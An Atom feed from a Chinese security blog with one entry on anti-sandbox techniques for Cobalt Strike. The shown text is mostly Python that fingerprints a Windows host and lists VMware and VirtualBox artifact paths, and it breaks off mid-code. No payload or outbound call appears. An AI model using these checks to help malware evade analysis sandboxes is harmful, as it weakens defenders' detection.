<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SafeKiller Zone</title>
  
  <subtitle>安全学的再好又有什么用 | 连自己喜欢的人都留不住</subtitle>
  <link href="https://jiangjiyue.github.io/atom.xml" rel="self"/>
  
  <link href="https://jiangjiyue.github.io/"/>
  <updated>2024-11-07T05:31:38.000Z</updated>
  <id>https://jiangjiyue.github.io/</id>
  
  <author>
    <name>Kill3r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CS-反沙箱杂谈</title>
    <link href="https://jiangjiyue.github.io/2024/11/07/c9983715/"/>
    <id>https://jiangjiyue.github.io/2024/11/07/c9983715/</id>
    <published>2024-11-07T04:59:49.000Z</published>
    <updated>2024-11-07T05:31:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 43.55K </p>    </div>    <div class="cell" style="">    <p>代码: 40.25K, 文本: 1.89K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 3.05 小时</p>    </div>    </div><h2 id="获取沙箱环境"><a href="#获取沙箱环境" class="headerlink" title="获取沙箱环境"></a>获取沙箱环境</h2><h3 id="检查CPU是否支持虚拟化"><a href="#检查CPU是否支持虚拟化" class="headerlink" title="检查CPU是否支持虚拟化"></a>检查CPU是否支持虚拟化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_cpu_virtualization</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 创建WMI对象，用于访问系统的管理信息</span></span><br><span class="line">        <span class="comment"># https://medium.com/@marcovit87/pywin32-and-wmi-windows-mangement-instrumentation-navigating-windows-os-with-python-4a73bfcce59a</span></span><br><span class="line">        c = wmi.WMI()</span><br><span class="line">        <span class="comment"># 初始化虚拟化信息和处理器名称的变量</span></span><br><span class="line">        virtualization_info = <span class="string">&quot;未能检索虚拟化信息&quot;</span></span><br><span class="line">        processor_name = <span class="string">&quot;未知处理器&quot;</span></span><br><span class="line">        <span class="comment"># 遍历系统中的所有处理器，通过WMI访问Win32_Processor类</span></span><br><span class="line">        <span class="keyword">for</span> processor <span class="keyword">in</span> c.Win32_Processor():</span><br><span class="line">            <span class="comment"># 获取处理器的名称</span></span><br><span class="line">            processor_name = processor.Name</span><br><span class="line">            <span class="comment"># 检查处理器是否具有VirtualizationFirmwareEnabled属性</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(processor, <span class="string">&quot;VirtualizationFirmwareEnabled&quot;</span>):</span><br><span class="line">                <span class="comment"># 如果有该属性，则处理器支持虚拟化，获取其值</span></span><br><span class="line">                virtualization_info = <span class="string">f&quot;支持虚拟化: <span class="subst">&#123;processor.VirtualizationFirmwareEnabled&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 如果没有该属性，则处理器不支持虚拟化</span></span><br><span class="line">                virtualization_info = <span class="string">&quot;处理器不支持虚拟化&quot;</span></span><br><span class="line">        <span class="comment"># 返回处理器名称和虚拟化信息的组合字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;处理器: <span class="subst">&#123;processor_name&#125;</span>\n<span class="subst">&#123;virtualization_info&#125;</span>\n&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在处理过程中发生异常，捕获并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking CPU virtualization: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure><h3 id="获取系统语言"><a href="#获取系统语言" class="headerlink" title="获取系统语言"></a>获取系统语言</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_language</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 调用 Windows API 函数 GetUserDefaultUILanguage 以获取当前用户的默认UI语言ID</span></span><br><span class="line">        <span class="comment"># 使用 ctypes.windll 来访问 kernel32.dll 并调用其导出函数</span></span><br><span class="line">        lang_id = ctypes.windll.kernel32.GetUserDefaultUILanguage()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 格式化返回的语言ID为十六进制字符串，并返回结果</span></span><br><span class="line">        <span class="comment"># 格式化字符串 &#x27;#04x&#x27; 将整数转换为四位的十六进制格式，前面带有 &quot;0x&quot;</span></span><br><span class="line">        <span class="comment"># https://winprotocoldocs-bhdugrdyduf5h2e4.b02.azurefd.net/MS-LCID/%5bMS-LCID%5d.pdf</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;语言ID: <span class="subst">&#123;lang_id:#04x&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在获取语言ID的过程中出现异常，捕获异常并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking language: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure><h3 id="获取进程信息"><a href="#获取进程信息" class="headerlink" title="获取进程信息"></a>获取进程信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_process_count</span>():</span><br><span class="line">    process_list = <span class="string">&quot;\n=== 进程列表 ===\n&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 创建一个 WMI 客户端对象，用于访问系统的管理信息</span></span><br><span class="line">        <span class="comment"># 通过 win32com.client 的 GetObject 方法连接到 WMI 服务</span></span><br><span class="line">        wmi_client = win32com.client.GetObject(<span class="string">&quot;winmgmts:&quot;</span>)</span><br><span class="line">        <span class="comment"># 通过调用 InstancesOf 方法获取当前系统中所有运行的进程实例</span></span><br><span class="line">        <span class="comment"># &quot;Win32_Process&quot; 是一个 WMI 类，表示系统中的进程</span></span><br><span class="line">        process_instances = wmi_client.InstancesOf(<span class="string">&quot;Win32_Process&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算当前运行的进程的数量</span></span><br><span class="line">        process_list += <span class="string">f&quot;进程数量:<span class="subst">&#123;<span class="built_in">len</span>(process_instances)&#125;</span>\n&quot;</span></span><br><span class="line">        <span class="keyword">for</span> process <span class="keyword">in</span> process_instances:</span><br><span class="line">            process_list += <span class="string">f&quot;进程名称: <span class="subst">&#123;process.Name&#125;</span>, PID: <span class="subst">&#123;process.ProcessId&#125;</span>\n&quot;</span></span><br><span class="line">        <span class="comment"># 返回进程数量的信息字符串</span></span><br><span class="line">        <span class="keyword">return</span> process_list</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在获取进程数量的过程中出现异常，捕获异常并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking process count: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure><h3 id="获取CPU信息"><a href="#获取CPU信息" class="headerlink" title="获取CPU信息"></a>获取CPU信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cpu_info</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 win32com.client 来访问 Windows WMI 服务</span></span><br><span class="line">        <span class="comment"># 获取一个 WMI 客户端对象，这样可以通过 WMI 查询获取系统信息</span></span><br><span class="line">        wmi_client = win32com.client.GetObject(<span class="string">&quot;winmgmts:&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用 WMI 查询 &quot;Win32_Processor&quot; 类来获取处理器信息</span></span><br><span class="line">        <span class="comment"># 通过生成器表达式计算查询结果中的处理器数量</span></span><br><span class="line">        cpu_count = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> wmi_client.ExecQuery(<span class="string">&quot;Select * from Win32_Processor&quot;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用 psutil 库获取物理核心数和逻辑处理器数</span></span><br><span class="line">        <span class="comment"># 返回一个格式化字符串，包含CPU数量、物理核心数和逻辑处理器数</span></span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="string">f&quot;CPU数量: <span class="subst">&#123;cpu_count&#125;</span>\n&quot;</span>  <span class="comment"># 从 WMI 获取的CPU数量</span></span><br><span class="line">            <span class="string">f&quot;CPU物理核心: <span class="subst">&#123;psutil.cpu_count(logical=<span class="literal">False</span>)&#125;</span>\n&quot;</span>  <span class="comment"># 物理核心数，不包括超线程逻辑核心</span></span><br><span class="line">            <span class="string">f&quot;CPU逻辑数量: <span class="subst">&#123;psutil.cpu_count()&#125;</span>\n&quot;</span>  <span class="comment"># 总逻辑处理器数，包括超线程</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在任何一步发生异常，捕获异常并返回包含错误信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking CPU count: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="获取开机时间"><a href="#获取开机时间" class="headerlink" title="获取开机时间"></a>获取开机时间</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_start_time</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 psutil 模块的 boot_time() 函数获取系统的启动时间</span></span><br><span class="line">        <span class="comment"># boot_time() 返回的是自 Unix 纪元以来的秒数，表示系统启动的时间</span></span><br><span class="line">        uptime = psutil.boot_time()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用 time 模块的 time() 函数获取当前的时间</span></span><br><span class="line">        <span class="comment"># time() 返回的是当前时间自 Unix 纪元以来的秒数</span></span><br><span class="line">        current_time = time.time()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算系统的运行时间（以分钟为单位）</span></span><br><span class="line">        <span class="comment"># 当前时间减去启动时间获取系统的运行时间（秒），再除以60转换为分钟</span></span><br><span class="line">        <span class="comment"># 使用格式化字符串将时间格式化为保留两位小数的浮点数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;开机时间: <span class="subst">&#123;(current_time - uptime) / <span class="number">60</span>:<span class="number">.2</span>f&#125;</span>分钟\n&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在计算开机时间的过程中出现异常，捕获异常并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking start time: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure><h3 id="获取虚拟环境DLLS"><a href="#获取虚拟环境DLLS" class="headerlink" title="获取虚拟环境DLLS"></a>获取虚拟环境DLLS</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_sandbox_dlls</span>():</span><br><span class="line">    <span class="comment"># 要检查的文件路径列表，这些路径通常与虚拟机或沙箱软件相关</span></span><br><span class="line">    <span class="comment"># 如果这些文件存在，可能表明该系统运行在虚拟机或沙箱环境中</span></span><br><span class="line">    file_paths = [</span><br><span class="line">        <span class="string">r&quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\Program Files\Common Files\VMware\Drivers\mouse\Win8\vmmousever.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\Vmmouse.sys&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\vmtray.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\VMToolsHook.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\vmmousever.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\vmhgfs.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\vmGuestLib.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\VBoxMouse.sys&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\VBoxGuest.sys&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\VBoxSF.sys&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\Drivers\VBoxVideo.sys&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxdisp.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxhook.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxoglerrorspu.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxoglpassthroughspu.dll&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxservice.exe&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\vboxtray.exe&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;C:\windows\System32\VBoxControl.exe&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化一个字符串，用于存储检查结果，并包含一个标题行</span></span><br><span class="line">    existing_files = <span class="string">&quot;=== 沙箱相关 === \n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历每个文件路径，检查该路径所指的文件是否存在</span></span><br><span class="line">    <span class="keyword">for</span> file_path <span class="keyword">in</span> file_paths:</span><br><span class="line">        <span class="comment"># 使用 os.path.exists() 检查文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(file_path):</span><br><span class="line">            <span class="comment"># 如果文件存在，将文件路径加入结果字符串</span></span><br><span class="line">            existing_files += <span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span>\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 如果文件不存在，记录文件未找到的信息</span></span><br><span class="line">            existing_files += <span class="string">f&quot;File not found: <span class="subst">&#123;file_path&#125;</span>\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回包含所有检查结果的字符串</span></span><br><span class="line">    <span class="keyword">return</span> existing_files</span><br></pre></td></tr></table></figure><h3 id="获取当前用户"><a href="#获取当前用户" class="headerlink" title="获取当前用户"></a>获取当前用户</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_user</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 尝试获取当前登录用户的用户名</span></span><br><span class="line">        <span class="comment"># os.getlogin() 返回当前在控制台上登录的用户的用户名</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;当前用户: <span class="subst">&#123;os.getlogin()&#125;</span>\n&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在获取用户名的过程中出现异常，捕获异常并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking admin user: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure><h3 id="获取硬盘信息"><a href="#获取硬盘信息" class="headerlink" title="获取硬盘信息"></a>获取硬盘信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_disk_info</span>():</span><br><span class="line">    <span class="comment"># 初始化一个包含标题的字符串，用于存储所有磁盘信息</span></span><br><span class="line">    disk_info = <span class="string">&quot;\n=== 硬盘信息 ===\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 psutil.disk_partitions() 获取系统中所有分区的信息</span></span><br><span class="line">        <span class="comment"># https://liaoxuefeng.com/books/python/third-party-modules/psutil/</span></span><br><span class="line">        partitions = psutil.disk_partitions()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 遍历每个分区，获取详细信息</span></span><br><span class="line">        <span class="keyword">for</span> partition <span class="keyword">in</span> partitions:</span><br><span class="line">            <span class="comment"># 获取分区的使用情况</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                usage = psutil.disk_usage(partition.mountpoint)  <span class="comment"># 获取分区的使用情况</span></span><br><span class="line">                total_size_gb = usage.total / (<span class="number">1024</span> ** <span class="number">3</span>)  <span class="comment"># 将字节转换为GB</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 将获取到的分区信息格式化并添加到 disk_info 字符串中</span></span><br><span class="line">                disk_info += (</span><br><span class="line">                    <span class="string">f&quot;盘符: <span class="subst">&#123;partition.device&#125;</span>\n&quot;</span>  <span class="comment"># 分区设备名</span></span><br><span class="line">                    <span class="string">f&quot;挂载点: <span class="subst">&#123;partition.mountpoint&#125;</span>\n&quot;</span>  <span class="comment"># 挂载点</span></span><br><span class="line">                    <span class="string">f&quot;文件系统类型: <span class="subst">&#123;partition.fstype&#125;</span>\n&quot;</span>  <span class="comment"># 文件系统类型</span></span><br><span class="line">                    <span class="string">f&quot;总大小: <span class="subst">&#123;total_size_gb:<span class="number">.2</span>f&#125;</span> GB\n\n&quot;</span>  <span class="comment"># 总大小，以GB为单位，保留两位小数</span></span><br><span class="line">                )</span><br><span class="line">            <span class="keyword">except</span> PermissionError:</span><br><span class="line">                <span class="comment"># 如果访问某个分区的使用情况时权限不足，捕获异常并记录相关信息</span></span><br><span class="line">                disk_info += (</span><br><span class="line">                    <span class="string">f&quot;盘符: <span class="subst">&#123;partition.device&#125;</span>\n&quot;</span>  <span class="comment"># 分区设备名</span></span><br><span class="line">                    <span class="string">&quot;挂载点: Access Denied\n&quot;</span>  <span class="comment"># 无法访问挂载点</span></span><br><span class="line">                    <span class="string">&quot;文件系统类型: Unknown\n&quot;</span>  <span class="comment"># 无法获取文件系统类型</span></span><br><span class="line">                    <span class="string">&quot;总大小: Unknown\n\n&quot;</span>  <span class="comment"># 无法获取总大小</span></span><br><span class="line">                )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在获取分区信息的过程中出现异常，捕获异常并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error retrieving disk information: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回包含所有分区信息的字符串</span></span><br><span class="line">    <span class="keyword">return</span> disk_info</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="获取MAC信息"><a href="#获取MAC信息" class="headerlink" title="获取MAC信息"></a>获取MAC信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_mac_addresses</span>():</span><br><span class="line">    <span class="comment"># 初始化一个字符串，用于存储所有接口的MAC地址信息</span></span><br><span class="line">    mac_addresses = <span class="string">&quot;=== 所有接口的MAC地址 ===\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 win32com.client 来访问 Windows WMI 服务</span></span><br><span class="line">        <span class="comment"># 获取一个 WMI 客户端对象，可以通过WMI查询获取系统信息</span></span><br><span class="line">        wmi_client = win32com.client.GetObject(<span class="string">&quot;winmgmts:&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用 WMI 查询 &quot;Win32_NetworkAdapter&quot; 类来获取所有网络适配器的信息</span></span><br><span class="line">        <span class="keyword">for</span> nic <span class="keyword">in</span> wmi_client.InstancesOf(<span class="string">&quot;Win32_NetworkAdapter&quot;</span>):</span><br><span class="line">            <span class="comment"># 检查网络适配器是否有MAC地址和网络连接ID</span></span><br><span class="line">            <span class="keyword">if</span> nic.MACAddress <span class="keyword">and</span> nic.NetConnectionID:</span><br><span class="line">                <span class="comment"># 如果MAC地址和连接ID存在，将其格式化并添加到 mac_addresses 字符串中</span></span><br><span class="line">                mac_addresses += (</span><br><span class="line">                    <span class="string">f&quot;接口名称: <span class="subst">&#123;nic.NetConnectionID&#125;</span>, &quot;</span>  <span class="comment"># 网络接口的连接名称</span></span><br><span class="line">                    <span class="string">f&quot;MAC地址: <span class="subst">&#123;nic.MACAddress&#125;</span>\n&quot;</span>  <span class="comment"># MAC地址</span></span><br><span class="line">                )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在任何步骤中发生异常，捕获异常并返回包含错误信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error retrieving MAC addresses: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回包含所有获取的MAC地址信息的字符串</span></span><br><span class="line">    <span class="keyword">return</span> mac_addresses</span><br></pre></td></tr></table></figure><h3 id="获取USB设备"><a href="#获取USB设备" class="headerlink" title="获取USB设备"></a>获取USB设备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_usb_devices</span>():</span><br><span class="line">    <span class="comment"># 初始化一个字符串，用于存储所有USB设备的信息</span></span><br><span class="line">    usb_devices = <span class="string">&quot;\n === USB设备信息 ===\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 win32com.client 来访问 Windows WMI 服务</span></span><br><span class="line">        <span class="comment"># 获取一个 WMI 客户端对象，可以通过WMI查询获取系统信息</span></span><br><span class="line">        wmi_client = win32com.client.GetObject(<span class="string">&quot;winmgmts:&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用 WMI 查询 &quot;Win32_PnPEntity&quot; 类来获取所有即插即用设备的信息</span></span><br><span class="line">        <span class="keyword">for</span> device <span class="keyword">in</span> wmi_client.InstancesOf(<span class="string">&quot;Win32_PnPEntity&quot;</span>):</span><br><span class="line">            <span class="comment"># 检查设备是否有名称，并且名称或描述中包含 &quot;USB&quot;</span></span><br><span class="line">            <span class="keyword">if</span> device.Name <span class="keyword">and</span> (<span class="string">&quot;USB&quot;</span> <span class="keyword">in</span> device.Name <span class="keyword">or</span> <span class="string">&quot;USB&quot;</span> <span class="keyword">in</span> device.Description):</span><br><span class="line">                <span class="comment"># 如果设备名称或描述中包含 &quot;USB&quot;，则认为是USB设备</span></span><br><span class="line">                <span class="comment"># 将设备的相关信息格式化并添加到 usb_devices 字符串中</span></span><br><span class="line">                usb_devices += (</span><br><span class="line">                    <span class="string">f&quot;设备名称: <span class="subst">&#123;device.Name&#125;</span>\n&quot;</span>  <span class="comment"># 设备的名称</span></span><br><span class="line">                    <span class="string">f&quot;设备ID: <span class="subst">&#123;device.DeviceID <span class="keyword">if</span> device.DeviceID <span class="keyword">else</span> <span class="string">&#x27;N/A&#x27;</span>&#125;</span>\n&quot;</span>  <span class="comment"># 设备ID，如果不存在则显示 &#x27;N/A&#x27;</span></span><br><span class="line">                    <span class="string">f&quot;PNP设备ID: <span class="subst">&#123;device.PNPDeviceID <span class="keyword">if</span> device.PNPDeviceID <span class="keyword">else</span> <span class="string">&#x27;N/A&#x27;</span>&#125;</span>\n&quot;</span>  <span class="comment"># PNP设备ID，如果不存在则显示 &#x27;N/A&#x27;</span></span><br><span class="line">                    <span class="string">f&quot;描述: <span class="subst">&#123;device.Description <span class="keyword">if</span> device.Description <span class="keyword">else</span> <span class="string">&#x27;N/A&#x27;</span>&#125;</span>\n\n&quot;</span>  <span class="comment"># 设备描述，如果不存在则显示 